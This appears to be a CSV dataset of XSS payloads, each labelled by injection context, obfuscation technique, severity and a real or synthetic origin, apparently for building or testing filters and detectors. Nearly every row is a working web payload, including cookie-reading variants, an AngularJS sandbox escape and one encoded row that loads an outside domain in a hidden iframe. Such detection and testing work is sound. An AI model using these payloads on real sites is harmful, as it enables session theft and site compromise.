payload,context,technique,severity,length,source
"<em onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</em>",event_handler,none,medium,79,real
"</script><svg onload='-/""/-confirm(1)//'""",event_handler,none,medium,41,real
"<label onmouseover=""alert(1)"">AnonKryptiQuz</label>",event_handler,none,medium,51,real
"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationstart=""alert(1)""></optgroup>",event_handler,none,medium,103,real
"<set onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</set>",event_handler,none,medium,67,real
<svg ontoggl&#101;=prompt('XSS')/>,tag_injection,synthetic,medium,34,synthetic
"<html onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</html>",event_handler,none,medium,61,real
"<tr draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</tr>",event_handler,none,medium,82,real
<script>/x/prompt(%27XSS%27)</script>,script_injection,synthetic,medium,37,synthetic
"<iframe src=""javascript:alert('AnonKryptiQuz')""></iframe>",js_uri,none,medium,57,real
'*prompt(1)*',generic,none,medium,13,real
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationend=""alert(1)""></bdi>",event_handler,none,medium,91,real
"<center draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</center>",event_handler,none,medium,90,real
"""><script+src=""https://wb.amap.com/channel.php?callback=alert(1337)""></script>",script_injection,none,medium,78,real
"<select onmousedown=""alert(1)"">AnonKryptiQuz</select>",event_handler,none,medium,53,real
"SetTimEouT(""ConFirM(STriNg.FroMChArCOde(88,83,83))"",0)",dom_sink,synthetic,medium,54,synthetic
"""{text:<img/src=x onload=confirm(1)>}""",event_handler,none,medium,38,real
"<slot onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</slot>",event_handler,none,medium,67,real
"\\"";alert('AnonKryptiQuz');//",generic,none,medium,29,real
"<a href="""" onmousedown=""var name = '&#39;;alert(1)//'; alert('smthg')"">Link</a>",event_handler,html_entity,medium,79,real
<dd onpointermove=alert(1) style=display:block>AnonKryptiQuz</dd>,event_handler,none,medium,65,real
"<select draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</select>",event_handler,none,medium,90,real
"<style>:target {color: red;}</style><menuitem id=x style=""transition:color 10s"" ontransitioncancel=print()></menuitem>",event_handler,none,low,118,real
<xmp onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"<canvas onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",event_handler,none,medium,74,real
""" onclick=\u0061lert(1) """,attribute_escape,synthetic,medium,25,synthetic
' onmouseenter=alert(document.domain) ',attribute_escape,synthetic,medium,39,synthetic
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(1010))'>",attribute_escape,comment_injection|case_variation,medium,77,real
</script><svg><script>alert(1)-%26apos%3B,script_injection,url_encoding,medium,41,real
' onerror=console.log(document.cookie) ',attribute_escape,synthetic,medium,40,synthetic
"<sub draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</sub>",event_handler,none,medium,62,real
<area onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</area><input value=clickme>,event_handler,none,medium,108,real
<script>alert(123)</script>,script_injection,none,medium,27,real
<img/src/onerror=alert/1337/(1)>,event_handler,none,low,32,real
<noscript id=x tabindex=1 onbeforeactivate=alert(1)></noscript>,event_handler,none,medium,63,real
"%22><svg onerror=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
<script>//confirm(document.domain)</script>,script_injection,synthetic,medium,43,synthetic
"<INPUT+TYPE=""IMAGE""+SRC=""javascript:alert(1);"">",js_uri,case_variation,medium,47,real
"<img src=x onerror=\x00""javascript:alert(0680)"">",event_handler,none,medium,48,real
"<footer onmousemove=""alert(1)"">AnonKryptiQuz</footer>",event_handler,none,medium,53,real
<script>javascript:alert(9764)</script\x0B,script_injection,none,medium,42,real
%22 ontoggle=alert(location.hash) %22,attribute_escape,synthetic,medium,37,synthetic
"<ruby onclick=""alert(1)"">AnonKryptiQuz</ruby>",event_handler,none,medium,45,real
"EvaL(""AleRt(1)"")",dom_sink,synthetic,medium,16,synthetic
#<img src=1 onerror=alert(1)>,event_handler,none,medium,29,real
"<style>@keyframes slidein {}</style><h1 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></h1>",event_handler,none,medium,158,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style=""position:absolute;"" onanimationcancel=""print()""></menuitem>",event_handler,none,low,185,real
"<style>@keyframes x{}</style><option style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></option>",event_handler,none,medium,105,real
%3Csvg onfocus=alert('XSS')%3E,tag_injection,synthetic,medium,30,synthetic
j&#97;vascript:confirm(document.domain),js_uri,synthetic,medium,39,synthetic
"<style>@keyframes slidein {}</style><footer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></footer>",event_handler,none,medium,172,real
%3Cdiv%20id%3D%22load%22%3E%3C%2Fdiv%3E%3Cscript%3Evar%20i%20%3D%20document.createElement%28%27iframe%27%29%3B%20i.style.display%20%3D%20%27none%27%3B%20i.onload%20%3D%20function%28%29%20%7B%20i.contentWindow.location.href%20%3D%20%27%2F%2Fxss.today%27%3B%20%7D%3B%20document.getElementById%28%27load%27%29.appendChild%28i%29%3B%3C%2Fscript%3E,dom_sink,url_encoding,low,343,real
"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>",event_handler,none,medium,115,real
"<option onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</option>",event_handler,none,medium,68,real
<script x>alert('AnonKryptiQuz')<script y>,script_injection,none,medium,42,real
%27 onbegin=console.log(location.hash) %27,attribute_escape,synthetic,medium,42,synthetic
<IMG SRC= jav&#x09;ascript:alert( AnonKryptiQuz ); >,tag_injection,html_entity|whitespace_obfuscation|case_variation,medium,52,real
<script>alert(“xss”)</script>,script_injection,none,medium,29,real
"<acronym draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</acronym>",event_handler,none,medium,90,real
<dfn onpointerleave=alert(1) style=display:block>AnonKryptiQuz</dfn>,event_handler,none,medium,68,real
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>,script_injection,case_variation,medium,40,real
<button popovertarget=x>Click me</button><style ontoggle=alert(1) popover id=x>AnonKryptiQuz</style>,event_handler,none,medium,100,real
"<sub onmouseout=""alert(1)"">AnonKryptiQuz</sub>",event_handler,none,medium,46,real
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>",event_handler,none,medium,103,real
"<pre onmouseleave=""alert(1)"">AnonKryptiQuz</pre>",event_handler,none,medium,48,real
"<picture onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</picture>",event_handler,none,medium,73,real
"""><Svg onCliCk=ConSolE.lOg(DocUmeNt.CooKie)>",tag_injection,synthetic,medium,44,synthetic
"<div id=""54""><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[""'`-->]]>]</div><div id=""55""><video><source onerror=""alert(55)"">//[""'`-->]]>]</div><div id=""56""><video onerror=""alert(56)""><source></source></video>//[""'`-->]]>]</div><div id=""57""><b <script>alert(57)//</script>0</script></b>//[""'`-->]]>]</div><div id=""58""><b><script<b></b><alert(58)</script </b></b>//[""'`-->]]>]</div><div id=""59""><div id=""div1""><input value=""``onmouseover=alert(59)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>//[""'`-->]]>]</div><div id=""60""><div style=""[a]color[b]:[c]red"">XXX</div>//[""'`-->]]>]</div>",script_injection,none,medium,736,real
"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" ontransitionend=alert(1)></pre>",event_handler,none,medium,104,real
"<style>@keyframes x{}</style><image style=""animation-name:x"" onwebkitanimationend=""alert(1)""></image>",event_handler,none,medium,101,real
"<span onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</span>",event_handler,none,medium,68,real
"<a oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,95,real
' onmous&#101;ov&#101;r=prompt('XSS') ',attribute_escape,synthetic,medium,39,synthetic
"""><Svg onCliCk=ProMpt(loCatIon.haSh)>",tag_injection,synthetic,medium,37,synthetic
%22 onmouseover=confirm(document.cookie) %22,attribute_escape,synthetic,medium,44,synthetic
"<ol draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</ol>",event_handler,none,medium,62,real
"<element onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</element>",event_handler,none,medium,72,real
<input3 onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</input3><input value=clickme>,event_handler,none,medium,103,real
"&#101;v&#97;l(""consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink,synthetic,medium,73,synthetic
"<style>:target {color:red;}</style><svg id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></svg>",event_handler,none,medium,110,real
"<hgroup id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></hgroup>",event_handler,none,medium,88,real
"<mark onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</mark>",event_handler,none,medium,61,real
<data id=x tabindex=1 onfocus=alert(1)></data>,event_handler,none,medium,46,real
<nextid onpointermove=alert(1) style=display:block>AnonKryptiQuz</nextid>,event_handler,none,medium,73,real
"<style>:target {color: red;}</style><svg id=x style=""transition:color 10s"" ontransitioncancel=print()></svg>",event_handler,none,low,108,real
<head onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</head><input value=clickme>,event_handler,none,medium,108,real
"<style>@keyframes x{}</style><p style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></p>",event_handler,none,medium,95,real
"<style><img src=""</style><img src=x onerror=javascript:alert(4204)//"">",event_handler,none,medium,70,real
"<multicol oncut=""alert(1)"" contenteditable>AnonKryptiQuz</multicol>",event_handler,none,medium,67,real
"<style>:target {color:red;}</style><canvas id=x style=""transition:color 1s"" ontransitionstart=alert(1)></canvas>",event_handler,none,medium,112,real
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>,dom_sink,none,low,64,real
"<iframe oncontextmenu=""alert(1)"">AnonKryptiQuz</iframe>",event_handler,none,medium,55,real
<--`<iMG/srC=` onerror=confirm``> --!>,event_handler,case_variation,low,38,real
"<data onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</data>",event_handler,none,medium,69,real
"<area draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</area>",event_handler,none,medium,66,real
<video><source onerror=alert(1) src=1></video>,event_handler,none,medium,46,real
<bdo onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
"<a2 onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</a2>",event_handler,none,medium,80,real
"""><Svg onMouSeeNteR=aLerT('XSS')>",tag_injection,synthetic,medium,33,synthetic
""" onmouseover=confirm(location.hash) """,attribute_escape,synthetic,medium,38,synthetic
"<style>:target {color: red;}</style><td id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></td>",event_handler,none,medium,107,real
"<div draggable=""true"" contenteditable>drag me</div><basefont ondrop=alert(1) contenteditable>drop here</basefont>",event_handler,none,medium,113,real
"<style>@keyframes slidein {}</style><title style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></title>",event_handler,none,medium,164,real
"<noembed onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,90,real
"""><Svg onMouSeeNteR=pRomPt(LocAtiOn.HasH)>",tag_injection,synthetic,medium,42,synthetic
"<details draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</details>",event_handler,none,medium,70,real
'\u003e\'</b><script>alert(document.cookie)</script><b><!--',script_injection,unicode_escape,high,60,real
<svg onfocus=console.log(location.hash)>,tag_injection,synthetic,medium,40,synthetic
j&#97;v&#97;script:void(consol&#101;.log(docum&#101;nt.dom&#97;in)),js_uri,synthetic,medium,67,synthetic
' onmous&#101;&#101;nt&#101;r=prompt(1) ',attribute_escape,synthetic,medium,41,synthetic
<xmp onpointerover=alert(1) style=display:block>AnonKryptiQuz</xmp>,event_handler,none,medium,67,real
"<frame ondblclick=""alert(1)"">AnonKryptiQuz</frame>",event_handler,none,medium,50,real
"<tr onmouseleave=""alert(1)"">AnonKryptiQuz</tr>",event_handler,none,medium,46,real
"<ul onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</ul>",event_handler,none,medium,66,real
""" oNmoUseOveR=cOnsOle.loG(1) """,attribute_escape,synthetic,medium,30,synthetic
<svg onbegin=prompt(1)/>,tag_injection,synthetic,medium,24,synthetic
"""><div style=""background-image: url(x)"" onerror=prompt(document.domain);>",event_handler,none,medium,73,real
"<menuitem draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</menuitem>",event_handler,none,medium,74,real
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationend=""alert(1)""></rt>",event_handler,none,medium,89,real
"""><Svg onCliCk=AleRt(LocAtiOn.HasH)>",tag_injection,synthetic,medium,36,synthetic
<svg onload=console.log('XSS')>,tag_injection,synthetic,medium,31,synthetic
"<script src=""#"">{alert(1)}</script>;1",script_injection,none,medium,37,real
<button popovertarget=x>Click me</button><legend ontoggle=alert(1) popover id=x>AnonKryptiQuz</legend>,event_handler,none,medium,102,real
"<animate onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animate>",event_handler,none,medium,87,real
"<figcaption draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",event_handler,none,medium,97,real
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>,script_injection,none,low,85,real
"<style>:target {transform: rotate(180deg);}</style><ruby id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></ruby>",event_handler,none,medium,126,real
<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>,event_handler,none,medium,66,real
<svG oNerRor=coNsoLe.Log(doCumEnt.doMaiN)/>,tag_injection,synthetic,medium,43,synthetic
"""`'><script>\x09javascript:alert(1)</script>",script_injection,none,medium,44,real
<svg onclick=confirm(%27XSS%27)>,tag_injection,synthetic,medium,32,synthetic
<ins onpointerover=alert(1) style=display:block>AnonKryptiQuz</ins>,event_handler,none,medium,67,real
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationend=""alert(1)""></tbody>",event_handler,none,medium,95,real
<form onpointerover=alert(1) style=display:block>AnonKryptiQuz</form>,event_handler,none,medium,69,real
"<element draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</element>",event_handler,none,medium,70,real
""" onfocus=console.log(document.cookie) autofocus=""",attribute_escape,synthetic,medium,50,synthetic
"<DIV STYLE=""width: expression(alert('XSS'));"">",attribute_escape,case_variation,medium,46,real
%3Cimg src='null' onerror=alert('spyerror')%3E,event_handler,url_encoding,medium,46,real
<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>,event_handler,none,medium,76,real
"<section onmousedown=""alert(1)"">AnonKryptiQuz</section>",event_handler,none,medium,55,real
""" onmouseenter=console.log('XSS') """,attribute_escape,synthetic,medium,35,synthetic
%3Csvg onclick=alert(document.cookie)/%3E,tag_injection,synthetic,medium,41,synthetic
"<iframe src=""javasc%0a%0dript:alert(0);"">",tag_injection,url_encoding,medium,41,real
"<input4 draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</input4>",event_handler,none,medium,88,real
"<video draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</video>",event_handler,none,medium,88,real
' onclick=\u0061lert('XSS') ',attribute_escape,synthetic,medium,29,synthetic
%3Cscript%3Econsole.log`'XSS'`%3C/script%3E,script_injection,synthetic,medium,43,synthetic
"<style onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</style>",event_handler,none,medium,71,real
"<style>:target {color:red;}</style><noscript id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></noscript>",event_handler,none,medium,120,real
%3Cscript%3E//alert(document.cookie)%3C/script%3E,script_injection,synthetic,medium,49,synthetic
' onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,58,synthetic
<bdi onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
"<div id=""104""><svg xmlns=""http://www.w3.org/2000/svg"" id=""foo"">",tag_injection,none,low,63,real
<image2 onpointerover=alert(1) style=display:block>AnonKryptiQuz</image2>,event_handler,none,medium,73,real
"<rtc onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",event_handler,none,medium,67,real
"<em onmousemove=""alert(1)"">AnonKryptiQuz</em>",event_handler,none,medium,45,real
"<style>@keyframes x{}</style><data style=""animation-name:x"" onanimationstart=""alert(1)""></data>",event_handler,none,medium,95,real
<section id=x tabindex=1 ondeactivate=alert(1)></section><input id=y autofocus>,event_handler,none,medium,79,real
"<dialog oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",event_handler,none,medium,75,real
<kbd contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,57,real
"""`'><script>\x0Ajavascript:alert(2855)</script>",script_injection,none,medium,47,real
<small onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"""><img src=x onerror=alert(1);>",event_handler,none,medium,31,real
"<article onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</article>",event_handler,none,medium,67,real
' ontoggle=alert(document.domain) ',attribute_escape,synthetic,medium,35,synthetic
"0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//"";alert(String.fromCharCode?(88,83,83))//\"";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search",script_injection,encoding|case_variation,medium,276,real
</script><script>alert('You got AnonKryptiQuzed')</script>,script_injection,none,medium,58,real
"<listing onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",event_handler,none,medium,76,real
Set.constructor`alert\x28document.domain\x29,dom_sink,none,low,44,real
"<a2 onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</a2>",event_handler,none,medium,77,real
"""><Svg onMouSeoVer=alErt(doCumEnt.doMaiN)>",tag_injection,synthetic,medium,42,synthetic
<svG oNmoUseOveR=pRomPt(LocAtiOn.HasH)/>,tag_injection,synthetic,medium,40,synthetic
<code onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</code><input value=clickme>,event_handler,none,medium,108,real
<svg ontoggle=prompt('XSS')>,tag_injection,synthetic,medium,28,synthetic
<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>,event_handler,none,medium,55,real
"<IMG DYNSRC=""javascript:alert('AnonKryptiQuz')"">",js_uri,case_variation,medium,48,real
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(9282)"">X",js_uri,none,medium,86,real
"<ol onmouseleave=""alert(1)"">AnonKryptiQuz</ol>",event_handler,none,medium,46,real
"<script draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,90,real
<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,event_handler,none,medium,72,real
"<frameset onmouseleave=""alert(1)"">AnonKryptiQuz</frameset>",event_handler,none,medium,58,real
"<section onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</section>",event_handler,none,medium,70,real
<svG oNmoUseOveR=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,44,synthetic
"{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(""astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};"");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}",template_injection,encoding,high,504,real
"<IMG SRC=x onstorage=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,60,real
"""%3E%3Csvg onmouseenter=confirm(1)%3E",tag_injection,synthetic,medium,37,synthetic
""" onfocus=\u0061lert(1) """,attribute_escape,synthetic,medium,25,synthetic
<button popovertarget=x>Click me</button><pre ontoggle=alert(1) popover id=x>AnonKryptiQuz</pre>,event_handler,none,medium,96,real
document.getElementById('btn').onclick = function(e){,event_handler,none,low,53,real
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,79,real
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",js_uri,case_variation,medium,66,real
<svg><meta onload=alert(1)></meta>,event_handler,none,medium,34,real
<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>,event_handler,none,medium,64,real
"&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\""XSS\"")';&lt;/STYLE&gt;",generic,html_entity,medium,70,real
<strong id=x tabindex=1 onbeforeactivate=alert(1)></strong>,event_handler,none,medium,59,real
<img/src/onerror=alert/*1337*/(1)>,event_handler,comment_injection,low,34,real
"<head draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</head>",event_handler,none,medium,85,real
"<script>//\u0061lert(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,medium,60,synthetic
"<u draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</u>",event_handler,none,medium,60,real
"<dir ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</dir>",event_handler,none,medium,87,real
' oNmoUseOveR=pRomPt(1) ',attribute_escape,synthetic,medium,25,synthetic
<del onpointerenter=alert(1) style=display:block>AnonKryptiQuz</del>,event_handler,none,medium,68,real
"%22 onerror=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,54,synthetic
"<link onclick=""alert(1)"" style=display:block>AnonKryptiQuz</link>",event_handler,none,medium,65,real
<noembed id=x tabindex=1 onbeforedeactivate=alert(1)></noembed><input autofocus>,event_handler,none,medium,80,real
""" onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,58,synthetic
<svg onmous&#101;ov&#101;r=confirm('XSS')>,tag_injection,synthetic,medium,42,synthetic
<image srcset=1 onerror=alert(1)>,event_handler,none,medium,33,real
"<data draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</data>",event_handler,none,medium,86,real
"<a href=""\x1Ejavascript:javascript:alert(2026)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationstart=""alert(1)""></hgroup>",event_handler,none,medium,99,real
<mark onpointermove=alert(1) style=display:block>AnonKryptiQuz</mark>,event_handler,none,medium,69,real
<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>,event_handler,none,medium,57,real
<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>,event_handler,none,medium,60,real
<svg onbegin=console.log(%27XSS%27)>,tag_injection,synthetic,medium,36,synthetic
"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationend=""alert(1)""></button>",event_handler,none,medium,97,real
"<del onmousedown=""alert(1)"">AnonKryptiQuz</del>",event_handler,none,medium,47,real
"<data draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</data>",event_handler,none,medium,64,real
"<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
<legend onfocusout=alert(1) tabindex=1 id=x></legend><input autofocus>,event_handler,none,medium,70,real
"<progress onclick=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",event_handler,none,medium,73,real
<scr	ipt>/*/alert(1)</scr	ipt>,script_injection,synthetic,medium,30,synthetic
"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",event_handler,none,medium,113,real
"<area onmouseup=""alert(1)"">AnonKryptiQuz</area>",event_handler,none,medium,47,real
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>,js_uri,html_entity,medium,78,real
<svg onbegin=alert(location.hash)>,tag_injection,synthetic,medium,34,synthetic
<svg onfocus=confirm(document.cookie)/>,tag_injection,synthetic,medium,39,synthetic
"<rp draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</rp>",event_handler,none,medium,62,real
"<style>:target {transform: rotate(180deg);}</style><data id=x style=""transition:transform 2s"" ontransitionrun=print()></data>",event_handler,none,low,125,real
"""><Svg onTogGle=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,medium,55,synthetic
"<ul onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</ul>",event_handler,none,medium,63,real
"<IMG SRC=x onselect=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,59,real
"setTimeout(""\u0061lert(document.domain)"",0)",dom_sink,synthetic,medium,43,synthetic
<menu onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</menu><input value=clickme>,event_handler,none,medium,99,real
"1')""<!--><Svg OnLoad=(confirm)(1)<!--",event_handler,case_variation,low,37,real
"' oNclIck=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape,synthetic,medium,50,synthetic
<source onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</source><input value=clickme>,event_handler,none,medium,112,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></code>",event_handler,none,medium,178,real
"<body oncut=""alert(1)"" contenteditable>AnonKryptiQuz</body>",event_handler,none,medium,59,real
"""><svg><img src=x onerror=prompt(document.domain);></svg>",event_handler,none,medium,57,real
""" onmouseenter=\u0061lert('XSS') """,attribute_escape,synthetic,medium,34,synthetic
"""><svg onload=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
<font id=x tabindex=1 onfocus=alert(1)></font>,event_handler,none,medium,46,real
&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;,generic,none,medium,72,real
"<rp id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></rp>",event_handler,none,medium,80,real
1script3document.vulnerable=true;1/script3,dom_sink,none,low,42,real
"<style>@keyframes slidein {}</style><meta style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></meta>",event_handler,none,medium,162,real
"<style>@keyframes slidein {}</style><image style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></image>",event_handler,none,medium,170,real
<img onload=\u0061lert('XSS')/>,tag_injection,synthetic,medium,31,synthetic
'-[document.domain].map(alert)-',dom_sink,none,low,32,real
"""autofocus onfocus='alert(document.domain)'",event_handler,none,medium,43,real
